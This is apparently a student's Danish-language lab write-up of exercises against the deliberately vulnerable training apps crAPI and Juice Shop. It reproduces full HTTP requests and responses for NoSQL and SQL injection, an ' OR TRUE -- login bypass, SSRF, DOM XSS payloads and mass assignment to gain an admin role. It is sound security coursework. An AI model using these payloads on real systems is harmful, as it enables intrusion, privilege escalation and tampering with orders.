# BFLA, Injection Attack & Mass assignment.

!!! note "Læringsmål"

    **Færdigheder**

    - Anvende metoder til at identificere og analysere sikkerhedsmæssige svagheder i webapplikationer
    - Udarbejde og gennemføre testforløb med henblik på vurdering af implementerede sikkerhedsforanstaltninger.
    - Tolke og vurdere testresultater i forhold til kendte sikkerhedsprincipper

    **Kompetencer**

    - Strukturere egen faglig udvikling inden for området og følge med i nye teknologier og trusselsbilleder.
    - Gennemføre vurdering af sikkerheden i webapplikationer på baggrund af systematiske test.

!!! note "Praktiske mål"

    - Den studerende har udført et SQL injection angreb
    - Den studerende har udført et Mass assignment angreb
    - Den studerende har udnyttet en BFLA sårbarhed


## Opgave - Injection, Mass assignment & BFLA.

!!! note "Opgave beskrivelse"
    crAPI øvelser

    - Udfør de tre øvelser i [Basic Injection attack](https://github.com/mesn1985/HackerLab/blob/main/crAPI/8_Basic_Injection_Attacks.md)
    - Udfør øvelsen i [Mass assignment](https://github.com/mesn1985/HackerLab/blob/main/crAPI/9_Basic_mass_assignment_Attacks.md)

    Juiceshop øvelser

    - Udfør de tre øvelser i [Basic Injection attack](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/JuiceShop/8_Basic_Injection_Attacks.md)
    - Udfør øvelsen i [Mass assignment](https://github.com/mesn1985/HackerLab/blob/main/JuiceShop/9_Basic_mass_assignment_Attacks.md)
    - Udfør de tre øvelser i [Basic BFLA](https://github.com/mesn1985/HackerLab/blob/main/JuiceShop/10_Basic_BFLAS.md)

### crAPI

#### Del opgave - Basic Injection Attack

##### Basic NoSQL Injection Attack

!!! note "Opgave beskrivelse"

    - In the crAPI web app, attempt to validate a coupon and capture the request in Burp Suite.
    - Modify the coupon code value in the request body to: `{ "$ne": 1 }`
    - Observe and interpret the response. If successful, note the returned coupon—you will need it for the next task.

Jeg opfangede en request til `/community/api/v2/coupon/validate-coupon` og erstattede værdien med `{ "$ne": 1 }`

??? note "Request"

    ```http linenums="0"
    POST /community/api/v2/coupon/validate-coupon HTTP/1.1
    Host: 127.0.0.1:8888
    Content-Length: 23
    sec-ch-ua-platform: "Windows"
    Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGEuY29tIiwiaWF0IjoxNzYyMTY3NzI0LCJleHAiOjE3NjI3NzI1MjQsInJvbGUiOiJ1c2VyIn0.mD8987F7uFGTAl13Ii7wvQnodth8j9Tx2_InNzh_fl5Lrlc4T3SpC1Dh3gs5wPCoXOXCHEwn5Eka8TT-HpZ7MMvGx72SR3OK0CdUV4s3-VHv0eMdV5Awh9pMrwDrg5xi8kXUGi68gzDnKy-fmJXWozm3yMN04lFGNRkeA72CbUGFHIuWGIuIqfMXZl8F6arXaaz-6ZGVleeqMFKM6MhcNKAvjrUeA-qqEH3CqZxX3xoCea_6Nl-MHyZi_HwTiZDRTRxbYcuTHJ4I74FqeMQYEnBmgM5_x4idZwZYcLz57lmzDJjE6Yqt141KxsdJw-PfUIQtQKtFyE1iLLXPXBOqNA
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    Accept: */*
    Origin: http://127.0.0.1:8888
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:8888/shop
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

    {
        "coupon_code":{"$ne": 2}
    }
    ```

Og ender med at modtage denne responce tilbage fra serveren.

```http linenums="0"
HTTP/1.1 200 OK
Server: openresty/1.25.3.1
Date: Mon, 03 Nov 2025 11:07:39 GMT
Content-Type: application/json
Connection: close
Access-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Content-Length: 79

{
    "coupon_code": "TRAC075",
    "amount": "75",
    "CreatedAt": "2025-09-01T08:10:25.529Z"
}
```

##### Basic SQL Injection – Retrieve Database Version

!!! note "Opgave beskrivelse"

    - Use the coupon retrieved in the previous exercise and capture the apply coupon request.
    - Change the coupon code in the request to: `0'; select version() --+`
    - Observe the reply and search online to determine the database type based on the returned version.

Ved at ændre `coupon_code` værdien i requesten til `/workshop/api/shop/apply_coupon`, til `0'; select version() --+` så modtager jeg versionen af databasen.

```json linenums="0"
{
    "message": "PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code"
}
```

Det kan ses her at jeg modtager en `message` tilbage som viser database navnet og version. Hvilket er `PostgreSQL 14.19`, og serveren køre Debian Linux.

##### Basic Server-Side Request Forgery (SSRF)

!!! note "Opgave beskrivelse"

    - Capture the POST request used to contact a mechanic.
    - Modify the request so that the API attempts a server-side call to https://www.google.dk.

Jeg opfanger en request som bliver lavet når man vil kontakte sin mekaniker. og ændre `mechanic_api` værdien i message body, til at være `https://www.google.dk`.

??? note "Request"

    ```http linenums="0"
    POST /workshop/api/merchant/contact_mechanic HTTP/1.1
    Host: 127.0.0.1:8888
    Content-Length: 213
    sec-ch-ua-platform: "Windows"
    Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGEuY29tIiwiaWF0IjoxNzYyMTY3NzI0LCJleHAiOjE3NjI3NzI1MjQsInJvbGUiOiJ1c2VyIn0.mD8987F7uFGTAl13Ii7wvQnodth8j9Tx2_InNzh_fl5Lrlc4T3SpC1Dh3gs5wPCoXOXCHEwn5Eka8TT-HpZ7MMvGx72SR3OK0CdUV4s3-VHv0eMdV5Awh9pMrwDrg5xi8kXUGi68gzDnKy-fmJXWozm3yMN04lFGNRkeA72CbUGFHIuWGIuIqfMXZl8F6arXaaz-6ZGVleeqMFKM6MhcNKAvjrUeA-qqEH3CqZxX3xoCea_6Nl-MHyZi_HwTiZDRTRxbYcuTHJ4I74FqeMQYEnBmgM5_x4idZwZYcLz57lmzDJjE6Yqt141KxsdJw-PfUIQtQKtFyE1iLLXPXBOqNA
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    Accept: */*
    Origin: http://127.0.0.1:8888
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:8888/contact-mechanic?VIN=8OFUL05KEOX516533
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

    {
        "mechanic_code":"TRAC_JHN",
        "problem_details":"bla bla",
        "vin":"8OFUL05KEOX516533",
        "mechanic_api":"https://www.google.dk",
        "repeat_request_if_failed":false,
        "number_of_repeats":1
    }
    ```

Det sesultere så i at serveren prøver at hente data fra `https://www.google.dk` i stedet for den rigtige API `http://127.0.0.1:8888/workshop/api/mechanic/receive_report`. Resultatet af dette er at serveren er sårbar over for SSRF, og jeg modtager hele html koden til `https://www.google.dk`, som kan ses her.

```json linenums="0"
{
    "response_from_mechanic_api": "<!doctype html><html itemscope=\"\" itemtype=\"http://schema.org/WebPage\" lang=\"da\"><head><meta content=\"text/html; charset=UTF-8\" http-equiv=\"Content-Type\"><meta content=\"/images/branding/googleg/1x/googleg_standard_color_128dp.png\" itemprop=\"image\"><title>Google</title><script nonce=\"dLpH_8ua6rgY21uXMNr5hA\">(function(){var _g={kEI:'E5AIaaObKY-Exc8Pk8PviAI',"    
}
```

Her kan en lille del af resultatet ses.

#### Del opgave - Mass Assignment

!!! note "Opgave beskrivelse"

    1. In the crAPI web application, create a new order (e.g., purchase a wheel).
    1. Navigate to Past Orders in the interface.
    1. Click Order Details for any order and capture the request using Burp Suite.
    1. Inspect the Allow header in the response—what HTTP methods are listed?
    1. In the response body, identify the current status of the order.
    1. Change the request method to PUT.
    1. Modify the request body as follows:

        ```json linenums="0"
        {
        "status": "returned"
        }
        ```

    1. Send the modified request.

Jeg køber et hjul, kigger på dens ordre detaljer, og opfanger requesten.
Jeg modtager denne resopnce tilbage:

```http linenums="0"
HTTP/1.1 200 OK
Server: openresty/1.25.3.1
Date: Mon, 03 Nov 2025 11:33:14 GMT
Content-Type: application/json
Connection: keep-alive
Allow: GET, POST, PUT, HEAD, OPTIONS
Vary: origin, Cookie
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 537

{
    "order": {
        "id": 19,
        "user": {
            "email": "user@a.com",
            "number": "1234"
        },
        "product": {
            "id": 2,
            "name": "Wheel",
            "price": "10.00",
            "image_url": "images/wheel.svg"
        },
        "quantity": 1,
        "status": "delivered",
        "transaction_id": "9ebcceb6-148a-4a5a-9822-2694aaf09dae",
        "created_on": "2025-11-03T11:32:44.430444"
    },
    "payment": {
        "transaction_id": "9ebcceb6-148a-4a5a-9822-2694aaf09dae",
        "order_id": 19,
        "amount": 10,
        "paid_on": "2025-11-03T11:32:44.430444",
        "card_number": "XXXXXXXXXXXX6505",
        "card_owner_name": "User A",
        "card_type": "MasterCard",
        "card_expiry": "12/2027",
        "currency": "USD"
    }
}
```

Ved at analysere og kigge på denne responce, kan man se i `allow` headeren at serveren tillader en række methods: `Allow: GET, POST, PUT, HEAD, OPTIONS`. Man kan også se i message body at status for denne ordre er "delivered". Jeg vil gerne se hvordan serveren håndtere det hvis jeg prøver at ændre i dele af de JSON ordre detaljer, ved at bruge `PUT` metoden og sende 
`{ "status": "returned" }`.

??? note "PUT Request"

    ```http linenums="0"
    PUT /workshop/api/shop/orders/19 HTTP/1.1
    Host: 127.0.0.1:8888
    sec-ch-ua-platform: "Windows"
    Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGEuY29tIiwiaWF0IjoxNzYyMTY3NzI0LCJleHAiOjE3NjI3NzI1MjQsInJvbGUiOiJ1c2VyIn0.mD8987F7uFGTAl13Ii7wvQnodth8j9Tx2_InNzh_fl5Lrlc4T3SpC1Dh3gs5wPCoXOXCHEwn5Eka8TT-HpZ7MMvGx72SR3OK0CdUV4s3-VHv0eMdV5Awh9pMrwDrg5xi8kXUGi68gzDnKy-fmJXWozm3yMN04lFGNRkeA72CbUGFHIuWGIuIqfMXZl8F6arXaaz-6ZGVleeqMFKM6MhcNKAvjrUeA-qqEH3CqZxX3xoCea_6Nl-MHyZi_HwTiZDRTRxbYcuTHJ4I74FqeMQYEnBmgM5_x4idZwZYcLz57lmzDJjE6Yqt141KxsdJw-PfUIQtQKtFyE1iLLXPXBOqNA
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    sec-ch-ua-mobile: ?0
    Accept: */*
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:8888/orders?order_id=19
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Content-Type: application/json

    {
        "status": "returned"
    }
    ```

Efter at have sendt denne request modtager jeg en `200 OK` med denne message body:

```json linenums="0"
{
    "orders": {
        "id": 19,
        "user": {
            "email": "user@a.com",
            "number": "1234"
        },
        "product": {
            "id": 2,
            "name": "Wheel",
            "price": "10.00",
            "image_url": "images/wheel.svg"
        },
        "quantity": 1,
        "status": "returned",
        "transaction_id": "9ebcceb6-148a-4a5a-9822-2694aaf09dae",
        "created_on": "2025-11-03T11:32:44.430444"
    }
}
```

Som det kan ses så er status for ordreren blevet ændret til "returned", derud over kan man gøre det samme ved "quantity". Hvis man nu sender den første request til bare at se ordre detaljerne vil man få dette tilbage:

```json linenums="0"
{
    "order": {
        "id": 19,
        "user": {
            "email": "user@a.com",
            "number": "1234"
        },
        "product": {
            "id": 2,
            "name": "Wheel",
            "price": "10.00",
            "image_url": "images/wheel.svg"
        },
        "quantity": 99,
        "status": "returned",
        "transaction_id": "9ebcceb6-148a-4a5a-9822-2694aaf09dae",
        "created_on": "2025-11-03T11:32:44.430444"
    },
    "payment": {
        "transaction_id": "9ebcceb6-148a-4a5a-9822-2694aaf09dae",
        "order_id": 19,
        "amount": 990,
        "paid_on": "2025-11-03T11:32:44.430444",
        "card_number": "XXXXXXXXXXXX6505",
        "card_owner_name": "User A",
        "card_type": "MasterCard",
        "card_expiry": "12/2027",
        "currency": "USD"
    }
}
```

Som det kan ses er denne ordre blevet retuneret og antallet er blevet ændret til 99.

### Juiceshop

#### Del opgave - Basic Injection attack

##### Basic SQL Injection Attack

!!! note "Opgave beskrivelse"

    1. In Juice Shop, attempt to authenticate with username: ' and password: 123. Capture the response.
    1. Inspect the response; it should be an error (usually HTTP 500). Take Notice of the error type.
    1. Look for the SQL query printed in the error message; And copy it to a text editor.
    1. Replace the email value in the copied SQL query with: `' OR TRUE --` and consider what effect this has on the query.
    1. In Juiceshop, Authenticate again using the username: `' OR TRUE --` and password: 123.
    1. Check which user you are authenticated as.

Jeg prøvet at authenticate med ' og passworded 123, og modtager en reposnce som indeholder fejl beskeder fra en sql database. fejl typen for den responce er en `500 Internal Server Error`. Her er hele message body fro den responce:

```json linenums="0"
{
    "error": {
        "message": "SQLITE_ERROR: unrecognized token: \"202cb962ac59075b964b07152d234b70\"",
        "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)",
        "name": "SequelizeDatabaseError",
        "parent": {
            "errno": 1,
            "code": "SQLITE_ERROR",
            "sql": "SELECT * FROM Users WHERE email = ''' AND password = '202cb962ac59075b964b07152d234b70' AND deletedAt IS NULL"
        },
        "original": {
            "errno": 1,
            "code": "SQLITE_ERROR",
            "sql": "SELECT * FROM Users WHERE email = ''' AND password = '202cb962ac59075b964b07152d234b70' AND deletedAt IS NULL"
        },
        "sql": "SELECT * FROM Users WHERE email = ''' AND password = '202cb962ac59075b964b07152d234b70' AND deletedAt IS NULL",
        "parameters": {}
    }
}
```

Ud fra denne SQL query vil `' OR TRUE --`, betyde at sql databasen godtager det da `TRUE` er med i den. så brugernavnet bliver til True, og da true altid er sandt, godtager den det som et valid brugernavn.

Efter at prøve at logge ind med `' OR TRUE --` og 123, ender jeg med at bliver logget ind som admin brugeren, det tænker jeg er fordi at det er den første bruger der er blevet lavet, og den første i listen.

##### Basic DOM Cross Site Scripting (XSS)

!!! note "Opgave beksrivelse"

    1. In the juiceshop search bar, Search for `hey` and observe the result.
    1. Search for `<h6>hey</h6>` and observe the change in font size of the search result, indicating that input is not HTML encoded.
    1. Search using HTML encoding `&#60;h6&#62;hey&#60;/h6&#62;` to see the raw HTML output.
    1. Try injecting a script tag: `<script>alert('You got hacked')</script>`. Observe that it does not execute.
    1. Inject an iframe with JS payload: `<iframe src="javascript:alert('You got hacked')">` and see if it executes.
    1. Try an image tag with an error event handler: `<img src=x onerror=alert('You got hacked')>`.

Søgefeltet i juiceshop er sårbar over for DOM XSS, og hvis man søger på noget med html heading tags som dette `<h6>` vil man kunne se at teksten bliver mindre, end hvis man ikke brugte det.

Hvis man bruger `&#60;h6&#62;hey&#60;/h6&#62` sker det ikke noget da siden godt kan finde ud af at sanitere HTML encoding, og resultatet bliver bare at man søger på `<h6>hey</h6>` i stedet for `hey` som bliver småt.

`<script>alert('You got hacked')</script>` Bliver ikke eksikveret.

`<iframe src="javascript:alert('You got hacked')">` Bliver eksikveret ordenligt.

`<img src=x onerror=alert('You got hacked')>` Bliver ikke eksikveret.

#### Del opgave - Mass assignment

!!! note "Opgave beskrivelse"

    In this exercise you will use mass assignment to perform an Escalation of privilege with a user account.

    First you must:

    1. Capture a sign up request
    1. Review the response in this request, and determine what attribute shows the users role
    1. Create a new request sign up request, with an extra parameter that sets the role as admin.

    Once you have done that, sign in to the juice page, and confirm that you can enter the admin page at the url: http://localhost:3000/#/administration You will probably need to authenticate

Jeg starter med at lave en ny bruger, med denne request.

!!! note "Opret bruger request"

    ```http linenums="0"
    POST /api/Users/ HTTP/1.1
    Host: localhost:3000
    Content-Length: 233
    sec-ch-ua-platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    Origin: http://localhost:3000
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://localhost:3000/
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=gXWy6ZqWnJPaLzDVMr53wkbl7voAJlfprGY1jR8p6NemQXKg942BxOyEKr9q

    {
        "email":"test@test.com",
        "password":"Test!",
        "passwordRepeat":"Test!",
        "securityQuestion":{
            "id":11,
            "question":"Your favorite book?",
            "createdAt":"2025-11-03T10:25:07.377Z",
            "updatedAt":"2025-11-03T10:25:07.377Z"
        },
        "securityAnswer":"book"
    }
    ```

Her er dataen for den responce jeg modtager tilbage.

```json linenums="0"
{
    "status": "success",
    "data": {
        "username": "",
        "role": "customer",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "/assets/public/images/uploads/default.svg",
        "isActive": true,
        "id": 23,
        "email": "test@test.com",
        "updatedAt": "2025-11-03T13:18:43.806Z",
        "createdAt": "2025-11-03T13:18:43.806Z",
        "deletedAt": null
    }
}
```

Ved at kigge på den er der et enkelt attribut som hanger min interesse, og det er `role`. Jeg vil gerne prøve at sette dette attribut selv i den `POST` request man laver når man registrerer en ny bruger. Jeg laver derfor denne request med en lidt anden email og password:

!!! note "set role request"

    ```http linenums="0"
    POST /api/Users/ HTTP/1.1
    Host: localhost:3000
    Content-Length: 233
    sec-ch-ua-platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
    Content-Type: application/json
    sec-ch-ua-mobile: ?0
    Origin: http://localhost:3000
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://localhost:3000/
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=gXWy6ZqWnJPaLzDVMr53wkbl7voAJlfprGY1jR8p6NemQXKg942BxOyEKr9q

    {
        "email":"test2@test.com",
        "password":"Test2!",
        "passwordRepeat":"Test2!",
        "role": "admin",
        "securityQuestion":{
            "id":11,
            "question":"Your favorite book?",
            "createdAt":"2025-11-03T10:25:07.377Z",
            "updatedAt":"2025-11-03T10:25:07.377Z"
        },
        "securityAnswer":"book"
    }
    ```

Her har jeg tilføjet `"role": "admin",`, så servere forhåbenligt skulle grive denne bruger admin rettigheder. Jeg modtager ern `201 Created` tilbage, med dette message body:

```json linenums="0"
{
    "status": "success",
    "data": {
        "username": "",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
        "isActive": true,
        "id": 24,
        "email": "test2@test.com",
        "role": "admin",
        "updatedAt": "2025-11-03T13:23:55.550Z",
        "createdAt": "2025-11-03T13:23:55.550Z",
        "deletedAt": null
    }
}
```

Her ligner det at serveren har godtaget brugerens rolle som admin. Jeg vil teste det ved at åbne en admin side.

![alt text](image.png)

som det kan ses på billedet her har jeg åbnet siden, og jeg brugte den nye admin bruger. Juiceshop giver også achievements for at have gjordt det.


